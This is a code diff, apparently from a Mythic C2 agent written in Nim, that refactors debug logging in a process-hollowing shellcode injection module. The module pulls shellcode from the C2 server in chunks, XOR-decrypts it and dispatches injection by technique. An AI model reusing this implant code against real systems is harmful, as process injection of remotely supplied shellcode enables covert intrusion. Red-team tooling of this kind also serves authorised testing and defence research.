@@ -1,5 +1,5 @@
-import ../config
 import ../utils/mythic_responses
+import ../utils/debug
 import ../global_data
 import std/[json, strutils, strformat, base64]
 
@@ -278,16 +278,13 @@ proc executeInjectHollow*(taskId: string, shellcode: seq[byte], params: JsonNode
 
 proc injectHollow*(taskId: string, params: JsonNode): JsonNode =
   ## Inject shellcode into a remote process using process hollowing
-  let cfg = getConfig()
-  
   when defined(windows):
     try:
       let args = to(params, InjectHollowArgs)
       
-      if cfg.debug:
-        echo "[DEBUG] Inject hollow: ", args.shellcode_name
-        echo "[DEBUG] Technique: ", args.technique
-        echo "[DEBUG] UUID for download: ", args.uuid
+      debug &"[DEBUG] Inject hollow: {args.shellcode_name}"
+      debug &"[DEBUG] Technique: {args.technique}"
+      debug &"[DEBUG] UUID for download: {args.uuid}"
       
       # Return initial response - request the file from Mythic
       return %*{
@@ -312,15 +309,13 @@ proc processInjectHollowChunk*(taskId: string, params: JsonNode, chunkData: stri
   when defined(windows):
     try:
       let args = to(params, InjectHollowArgs)
-      let cfg = getConfig()
       
       # Decode and append chunk data
       let decodedChunk = decode(chunkData)
       for b in decodedChunk:
         fileData.add(cast[byte](b))
       
-      if cfg.debug:
-        echo &"[DEBUG] Inject hollow: Received chunk {currentChunk}/{totalChunks}, accumulated {fileData.len} bytes"
+      debug &"[DEBUG] Inject hollow: Received chunk {currentChunk}/{totalChunks}, accumulated {fileData.len} bytes"
       
       # If more chunks remain, request the next one
       if currentChunk < totalChunks:
@@ -344,8 +339,6 @@ proc processInjectHollowChunk*(taskId: string, params: JsonNode, chunkData: stri
 
 proc executeInjectHollow*(taskId: string, shellcode: seq[byte], params: JsonNode): JsonNode =
   ## Execute the shellcode injection after download is complete
-  let cfg = getConfig()
-  
   when defined(windows):
     try:
       let args = to(params, InjectHollowArgs)
@@ -357,12 +350,10 @@ proc executeInjectHollow*(taskId: string, shellcode: seq[byte], params: JsonNode
       # Decrypt shellcode if key is provided
       var finalShellcode = shellcode
       if args.key.len > 0:
-        if cfg.debug:
-          echo "[DEBUG] Decrypting shellcode with XOR key"
+        debug "[DEBUG] Decrypting shellcode with XOR key"
         finalShellcode = xorDecrypt(shellcode, args.key)
       
-      if cfg.debug:
-        echo "[DEBUG] Injecting shellcode (", finalShellcode.len, " bytes) via ", args.technique
+      debug &"[DEBUG] Injecting shellcode ({finalShellcode.len} bytes) via {args.technique}"
       
       var result: tuple[success: bool, error: string]
       case args.technique.toLower():
